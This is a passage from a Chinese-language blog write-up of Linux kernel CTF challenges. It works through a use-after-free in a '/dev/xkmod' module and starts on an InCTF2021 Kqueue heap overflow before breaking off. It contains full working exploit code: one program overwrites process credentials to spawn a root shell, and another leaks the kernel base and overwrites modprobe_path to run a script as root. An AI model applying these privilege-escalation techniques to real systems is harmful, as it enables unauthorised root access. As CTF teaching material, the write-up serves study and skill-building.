class_">user_arg</span>&#123;<br>    <span class="hljs-type">void</span> *buffer;<br>    <span class="hljs-type">int</span> offset, size;<br>&#125;data;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">alloc_kernelmem</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x1111111</span>, &amp;data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_kernelmsg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x7777777</span>, &amp;data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put_usermsg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x6666666</span>, &amp;data);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> dev_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">size_t</span> length = <span class="hljs-number">0x50</span>;<br>    data.buffer = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.size = <span class="hljs-number">0x50</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>; i++)&#123;<br>        dev_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;step1\n&quot;</span>);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">close</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;step2:\n&quot;</span>);<br>    <span class="hljs-type">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(!pid)&#123;   <span class="hljs-comment">//child process</span><br>        <span class="hljs-built_in">get_kernelmsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">if</span>(((<span class="hljs-type">int</span> *)data.buffer)[<span class="hljs-number">3</span>] == <span class="hljs-number">0x3e8</span>)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)&#123;<br>                ((<span class="hljs-type">int</span> *)data.buffer)[i] = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">getuid</span>())&#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Get Root Priviledge!&quot;</span>);<br>                <span class="hljs-built_in">setresuid</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>                <span class="hljs-built_in">setresgid</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>                <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">wait</span>();<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="http://imgsrc.baidu.com/forum/pic/item/3812b31bb051f81935f124799cb44aed2e73e729.jpg"></p><h3 id="3-normal-mode"><a href="#3-normal-mode" class="headerlink" title="3. normal mode"></a>3. normal mode</h3><p>我们在easy mode当中已经实现了UAFobj的读取，我们可以查看以下读取的UAF内容来查看改出题人构造的<code>kmem_cache</code>中offset的值，在测试的过程中我们可以看到一般读取的UAF块其中头8字节都是我们的一个kernel heap地址，因此我们可以推测其中每个空闲object的下一块链接指针在偏移为0处</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/0df3d7ca7bcb0a461389a20a2d63f6246b60af5e.jpg"></p><p>而在学习<a href="https://arttnba3.cn/">arttnba3师傅</a>的博客途中发现其中记录了两种内核配置的保护手段，如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">config SLAB_FREELIST_RANDOM<br><span class="hljs-type">bool</span> &quot;Randomize slab freelist&quot;<br><span class="hljs-keyword">depends</span> <span class="hljs-keyword">on</span> SLAB || SLUB<br>help<br>  Randomizes the freelist <span class="hljs-keyword">order</span> used <span class="hljs-keyword">on</span> creating <span class="hljs-built_in">new</span> pages. This<br>  <span class="hljs-keyword">security</span> feature reduces the predictability <span class="hljs-keyword">of</span> the kernel slab<br>  allocator against heap overflows.<br><br>config SLAB_FREELIST_HARDENED<br><span class="hljs-type">bool</span> &quot;Harden slab freelist metadata&quot;<br><span class="hljs-keyword">depends</span> <span class="hljs-keyword">on</span> SLUB<br>help<br>  Many kernel heap attacks try <span class="hljs-keyword">to</span> target slab <span class="hljs-keyword">cache</span> metadata and<br>  other infrastructure. This options makes minor performance<br>  sacrifices to harden the kernel slab allocator against common<br>  freelist exploit methods.<br></code></pre></td></tr></table></figure><p>其中第一种是在我们创建新的pages页面的时候其中会打乱我们freelist的顺序，也就是一开始是乱序的。</p><p>其二若是在kernel中配置了Y，那么就会在<code>kmem_cache</code>中添加一个额外的字段<code>random_seq</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab cache management.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br>...<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>...<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>他的作用我感觉同glibc中safe unlink 类似，都是在指向下一个指针的地址异或上一个值，而这里的特殊值就是<code>random_seq</code></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Returns freelist pointer (ptr). With hardening, this is obfuscated</span><br><span class="hljs-comment"> * with an XOR of the address where the pointer is held and a per-cache</span><br><span class="hljs-comment"> * random number.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title">freelist_ptr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *ptr,</span></span><br><span class="hljs-params"><span class="hljs-function"> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr_addr)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span><br><span class="hljs-comment"> * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span><br><span class="hljs-comment"> * and get_freepointer() are called with a pointer with the same tag.</span><br><span class="hljs-comment"> * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span><br><span class="hljs-comment"> * example, when __free_slub() iterates over objects in a cache, it</span><br><span class="hljs-comment"> * passes untagged pointers to check_object(). check_object() in turns</span><br><span class="hljs-comment"> * calls get_freepointer() with an untagged pointer, which causes the</span><br><span class="hljs-comment"> * freepointer to be restored incorrectly.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)ptr ^ s-&gt;random ^<br><span class="hljs-built_in">swab</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)<span class="hljs-built_in">kasan_reset_tag</span>((<span class="hljs-type">void</span> *)ptr_addr)));<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">return</span> ptr;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码可以看到在获取freelist指针的时候会异或一个随机值跟本身的地址，在本题的测试当中看不出来异或的痕迹，</p><p>所以说判断题目中关于以上两个保护措施的配置为</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_SLAB_FREELIST_HARDENED</span> = <span class="hljs-string">&#x27;n&#x27;</span><br><span class="hljs-attr">CONFIG_SLAB_FREELIST_RANDOM</span>   = <span class="hljs-string">&#x27;y&#x27;</span><br></code></pre></td></tr></table></figure><p>且其中next指针在object中的偏移为0，</p><p>而因为我们知道了一个堆地址，所以我们可以推测一下kernel heap的堆起始地址，然后又因为KASLR的粒度为256MB在<code>page_offset_base + 0x9d000</code>的地址里存放着我们的一个内核函数<code>secondary_startup_64</code>的地址，而该函数对于内核基地址始终差0x30字节，因此我们也可以通过该值来检测我们的内核基地址猜测是否正确</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b17eca8065380cd796bf8bdee744ad345982815b.jpg"></p><p>知道内核基地址实际上我们就可以利用<code>Arbitrary write</code>来构成任意写，那么具体该写哪儿呢？</p><p>这里引入一种提权手法那就是覆写<code>modeprobe_path</code>，这里的地址可以通过一点小技巧来查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">modprobe_path is set via /proc/sys.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">char</span> modprobe_path[KMOD_PATH_LEN] = CONFIG_MODPROBE_PATH;<br></code></pre></td></tr></table></figure><p>我们可以在root用户下查看<code>/proc/sys/kernel/modprobe</code>来查看其默认值，但一般都是<code>/sbin/modprobe</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ # cat /</span>proc<span class="hljs-regexp">/sys/</span>kernel/modprobe   <br><span class="hljs-regexp">/sbin/m</span>odprobe                      <br></code></pre></td></tr></table></figure><p>那我们该如何找到modprobe_path的地址呢，我们通过源码可以看到，在调用<code>__request_module</code>函数的时候，</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> <span class="hljs-constructor">__request_module(<span class="hljs-params">bool</span> <span class="hljs-params">wait</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span><span class="hljs-params">fmt</span>, <span class="hljs-operator">...</span>)</span><br>&#123;<span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span><br><span class="hljs-operator"></span><span class="hljs-keyword">if</span> (!modprobe_path<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>)<br>return -ENOENT;<span class="hljs-operator"></span><br><span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span>&#125;<br></code></pre></td></tr></table></figure><p>这里我们可以查看以下其中的汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ffffffff8108c690 &lt;__request_module&gt;:                                                                     <br>ffffffff8108c690:   55                      push   rbp                                                   <br>ffffffff8108c691:   48 89 e5                mov    rbp,rsp                                               <br>ffffffff8108c694:   41 56                   push   r14                                                   <br>ffffffff8108c696:   41 55                   push   r13                                                   <br>ffffffff8108c698:   41 54                   push   r12                                                   <br>ffffffff8108c69a:   49 89 f4                mov    r12,rsi                                               <br>ffffffff8108c69d:   41 52                   push   r10                                                   <br>ffffffff8108c69f:   4c 8d 55 10             lea    r10,[rbp+0x10]                                        <br>ffffffff8108c6a3:   53                      push   rbx                                                   <br>ffffffff8108c6a4:   4d 89 d5                mov    r13,r10                                               <br>ffffffff8108c6a7:   89 fb                   mov    ebx,edi                                               <br>ffffffff8108c6a9:   48 81 ec b0 00 00 00    sub    rsp,0xb0                                              <br>ffffffff8108c6b0:   48 89 55 b8             mov    QWORD PTR [rbp-0x48],rdx                              <br>ffffffff8108c6b4:   48 89 4d c0             mov    QWORD PTR [rbp-0x40],rcx                              <br>ffffffff8108c6b8:   4c 89 45 c8             mov    QWORD PTR [rbp-0x38],r8                               <br>ffffffff8108c6bc:   4c 89 4d d0             mov    QWORD PTR [rbp-0x30],r9                               <br>ffffffff8108c6c0:   65 48 8b 04 25 28 00    mov    rax,QWORD PTR gs:0x28                                 <br>ffffffff8108c6c7:   00 00                                                                                <br>ffffffff8108c6c9:   48 89 45 a0             mov    QWORD PTR [rbp-0x60],rax                              <br>ffffffff8108c6cd:   31 c0                   xor    eax,eax                                               <br>ffffffff8108c6cf:   40 84 ff                test   dil,dil                                               <br>ffffffff8108c6d2:   0f 85 80 01 00 00       jne    ffffffff8108c858 &lt;__request_module+0x1c8&gt;             <br>ffffffff8108c6d8:   80 3d 21 80 3b 01 00    cmp    BYTE PTR [rip+0x13b8021],0x0       # ffffffff82444700<br><br></code></pre></td></tr></table></figure><p>最底下只有那么一个cmp指令，因此我们可以断定他就是我们<code>modprobe_path</code>的值，因此我们只需要利用其中任意写的漏洞修改他为一个我们想要执行的文件即可，当然，拥有root权限</p><p>下面就是本次的利用情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f3d3572c11dfa9ec4c9e7e2424d0f703918fc155.jpg"></p><p>exp如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HOME_PATH <span class="hljs-string">&quot;/home/flag.sh&quot;</span></span><br><span class="hljs-type">char</span> userful_shell[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODPROBE_PATH 0xffffffff82444700</span><br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_arg</span>&#123;<br>    <span class="hljs-type">size_t</span> *buffer;<br>    <span class="hljs-type">int</span> offset, size;<br>&#125;data;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">alloc_kernelmem</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x1111111</span>, &amp;data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_kernelmsg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x7777777</span>, &amp;data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put_usermsg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x6666666</span>, &amp;data);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> dev_fd[<span class="hljs-number">5</span>];<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.size = <span class="hljs-number">0x50</span>;<br>    data.buffer = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">size_t</span> kernel_base, kernel_offset;<br>    <br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(HOME_PATH, O_RDWR|O_CREAT);<br>    <span class="hljs-built_in">write</span>(fd, userful_shell, <span class="hljs-built_in">sizeof</span>(userful_shell));<br>    <span class="hljs-built_in">close</span>(fd);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod +x /home/flag.sh&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> page_offset_base;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)&#123;<br>        dev_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Step I:Construct the UAF obj...&quot;</span>);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">memset</span>((<span class="hljs-type">char</span> *)data.buffer, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>);<br>    <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">close</span>(dev_fd[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Step II:Leak the Kernel base&quot;</span>);<br>        <br>    <span class="hljs-built_in">get_kernelmsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    page_offset_base = data.buffer[<span class="hljs-number">0</span>]&amp;<span class="hljs-number">0xfffffffff0000000</span>;    <span class="hljs-comment">//KASLR 256MB*n</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Get the Guessing page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);<br>    <span class="hljs-comment">/* Checking for the correction */</span><br>    data.buffer[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span> - <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">3</span>]);<br>    <span class="hljs-built_in">get_kernelmsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span>((data.buffer[<span class="hljs-number">2</span>]&amp;<span class="hljs-number">0xfff</span>) != <span class="hljs-number">0x030</span>)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Unfortunatlly!We guess the page_offset_base failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    kernel_base = data.buffer[<span class="hljs-number">2</span>] - <span class="hljs-number">0x30</span>;<br>    kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Kernel_base :0x%lx\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Kernel_offset :0x%lx\n&quot;</span>, kernel_offset);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Step III:Arbitrary write the modprobe_path...&quot;</span>);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">close</span>(dev_fd[<span class="hljs-number">4</span>]);<br>    data.buffer[<span class="hljs-number">0</span>] = MODPROBE_PATH + kernel_offset - <span class="hljs-number">0x8</span>;<br>    <span class="hljs-comment">/**/</span><br>    <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)&amp;(data.buffer[<span class="hljs-number">1</span>]), <span class="hljs-string">&quot;/home/flag.sh&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]this is a debug...&quot;</span>);<br>    <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Step IV:Handle the fake file...&quot;</span>);<br>    <br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod +x /home/fake&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/home/fake&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="七、Kernel-Heap-Heap-Overflow"><a href="#七、Kernel-Heap-Heap-Overflow" class="headerlink" title="七、Kernel Heap - Heap Overflow"></a>七、Kernel Heap - Heap Overflow</h1><h2 id="例题：InCTF2021-Kqueue"><a href="#例题：InCTF2021-Kqueue" class="headerlink" title="例题：InCTF2021 - Kqueue"></a>例题：InCTF2021 - Kqueue</h2><p>据arttnab3师傅据Scupxa0s师傅说说这是印度的强网杯:dog:,改题目有个坑点那就是权限存在着问题，当拿到题目解压文件系统时我们需要以root用户的权限来进行解压跟打包，不然就会出现kernel init error</p><h3 id="1-题目逆向-4"><a href="#1-题目逆向-4" class="headerlink" title="1.题目逆向"></a>1.题目逆向</h3><p>题目运行脚本没开pti、smep、smap,所以我们可以采取ret2usr来做</p><p>首先分析漏洞模块，在这里大致分析一下，题目也是很贴心的给出了模块源码让我们分析</p><p>首先分析其中带的数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span>                                                    <br>    <span class="hljs-type">uint16_t</span> data_size;                                            <br>    <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">/* This needs to handle larger numbers */</span> <br>    <span class="hljs-type">uint32_t</span> max_entries;                                          <br>    <span class="hljs-type">uint16_t</span> idx;                                                  <br>    <span class="hljs-type">char</span>* data;                                                    <br>&#125;<span class="hljs-built_in">queue</span>;                                                            <br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span>               <br>    <span class="hljs-type">uint16_t</span> idx;                 <br>    <span 